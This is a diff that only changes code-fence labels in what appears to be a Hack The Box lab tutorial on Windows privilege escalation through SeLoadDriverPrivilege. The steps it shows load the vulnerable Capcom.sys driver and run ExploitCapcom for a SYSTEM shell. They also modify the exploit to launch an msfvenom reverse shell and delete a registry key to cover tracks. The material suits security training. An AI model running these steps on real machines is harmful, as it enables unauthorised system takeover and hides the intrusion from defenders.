@@ -6,8 +6,7 @@
 
 #### Confirming Privileges
 
-```
-        cmd
+```bat
 C:\htb> whoami /priv
 
 PRIVILEGES INFORMATION
@@ -24,8 +23,7 @@ SeShutdownPrivilege      Shut down the system                 Disabled
 
 The [UACMe](https://github.com/hfiref0x/UACME) repo features a comprehensive list of UAC bypasses, which can be used from the command line. Alternatively, from a GUI, we can open an administrative command shell and input the credentials of the account that is a member of the Print Operators group. If we examine the privileges again, `SeLoadDriverPrivilege` is visible but disabled.
 
-```
-        cmd
+```bat
 C:\htb> whoami /priv
 
 PRIVILEGES INFORMATION
@@ -58,8 +56,7 @@ Next, from a Visual Studio 2019 Developer Command Prompt, compile it using **cl.
 
 #### Compile with cl.exe
 
-```
-        cmd
+```bat
 C:\Users\mrb3n\Desktop\Print Operators>cl /DUNICODE /D_UNICODE EnableSeLoadDriverPrivilege.cpp
 
 Microsoft (R) C/C++ Optimizing Compiler Version 19.28.29913 for x86
@@ -77,8 +74,7 @@ EnableSeLoadDriverPrivilege.obj
 
 Next, download the `Capcom.sys` driver from [here](https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys), and save it to `C:\temp`. Issue the commands below to add a reference to this driver under our HKEY\_CURRENT\_USER tree.
 
-```
-        cmd
+```bat
 C:\htb> reg add HKCU\System\CurrentControlSet\CAPCOM /v ImagePath /t REG_SZ /d "\??\C:\Tools\Capcom.sys"
 
 The operation completed successfully.
@@ -94,8 +90,7 @@ The odd syntax `\??\` used to reference our malicious driver's ImagePath is an [
 
 Using Nirsoft's [DriverView.exe](http://www.nirsoft.net/utils/driverview.html), we can verify that the Capcom.sys driver is not loaded.
 
-```
-        powershell
+```powershell
 PS C:\htb> .\DriverView.exe /stext drivers.txt
 PS C:\htb> cat drivers.txt | Select-String -pattern Capcom
 ```
@@ -104,8 +99,7 @@ PS C:\htb> cat drivers.txt | Select-String -pattern Capcom
 
 Run the `EnableSeLoadDriverPrivilege.exe` binary.
 
-```
-        cmd
+```bat
 C:\htb> EnableSeLoadDriverPrivilege.exe
 
 whoami:
@@ -124,8 +118,7 @@ NTSTATUS: 00000000, WinError: 0
 
 Next, verify that the Capcom driver is now listed.
 
-```
-        powershell
+```powershell
 PS C:\htb> .\DriverView.exe /stext drivers.txt
 PS C:\htb> cat drivers.txt | Select-String -pattern Capcom
 
@@ -137,8 +130,7 @@ Filename              : C:\Tools\Capcom.sys
 
 To exploit the Capcom.sys, we can use the [ExploitCapcom](https://github.com/tandasat/ExploitCapcom) tool after compiling with it Visual Studio.
 
-```
-        powershell
+```powershell
 PS C:\htb> .\ExploitCapcom.exe
 
 [*] Capcom.sys exploit
@@ -159,8 +151,7 @@ This launches a shell with SYSTEM privileges.
 
 If we do not have GUI access to the target, we will have to modify the `ExploitCapcom.cpp` code before compiling. Here we can edit line 292 and replace `"C:\\Windows\\system32\\cmd.exe"` with, say, a reverse shell binary created with `msfvenom`, for example: `c:\ProgramData\revshell.exe`.
 
-```
-        C
+```c
 // Launches a command shell process
 static bool LaunchShell()
 {
@@ -182,8 +173,7 @@ static bool LaunchShell()
 
 The `CommandLine` string in this example would be changed to:
 
-```
-        C
+```c
  TCHAR CommandLine[] = TEXT("C:\\ProgramData\\revshell.exe");
 ```
 
@@ -197,8 +187,7 @@ We would set up a listener based on the `msfvenom` payload we generated and hope
 
 We can use a tool such as [EoPLoadDriver](https://github.com/TarlogicSecurity/EoPLoadDriver/) to automate the process of enabling the privilege, creating the registry key, and executing `NTLoadDriver` to load the driver. To do this, we would run the following:
 
-```
-        cmd
+```bat
 C:\htb> EoPLoadDriver.exe System\CurrentControlSet\Capcom c:\Tools\Capcom.sys
 
 [+] Enabling SeLoadDriverPrivilege
@@ -217,8 +206,7 @@ We would then run `ExploitCapcom.exe` to pop a SYSTEM shell or run our custom bi
 
 We can cover our tracks a bit by deleting the registry key added earlier.
 
-```
-        cmd
+```bat
 C:\htb> reg delete HKCU\System\CurrentControlSet\Capcom
 
 Permanently delete the registry key HKEY_CURRENT_USER\System\CurrentControlSet\Capcom (Yes/No)? Yes
